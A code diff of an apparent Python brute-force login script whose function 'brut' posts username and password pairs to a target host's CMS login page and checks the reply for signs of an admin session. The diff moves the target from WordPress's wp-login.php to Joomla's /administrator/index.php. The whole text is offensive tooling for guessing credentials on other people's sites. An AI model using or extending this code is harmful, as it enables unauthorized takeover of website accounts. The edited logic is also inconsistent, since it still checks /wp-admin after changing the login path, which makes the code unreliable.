@@ -24,11 +24,15 @@ def brut(string):
         'pwd':t[1],
         #'wp-submit': 'Log+In',
         #'rememberme': 'forever',
-        'redirect_to': 'http://'+t[2]+'/wp-admin',
         'testcookie': '1'
     }
-    url = 'https://'+t[2]+'/wp-login.php'
+    url = 'http://'+t[2]+'/administrator/index.php'
     s = requests.Session()
+    try:    
+        s.get(url, headers=headers, timeout = 10)
+    except Exception:
+        print('ERROR')
+        return False
     try:    
         s.post(url, data=payload, headers=headers, timeout = 10)
     except Exception:
@@ -38,7 +42,7 @@ def brut(string):
     '''if s.text.find('action=lostpassword')>0:action=logout
         return False
     else:'''
-    response = s.get('https://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
+    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
     #if response.status_code == 200:
     if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
     #if response.text.find('action=lostpassword')<0:
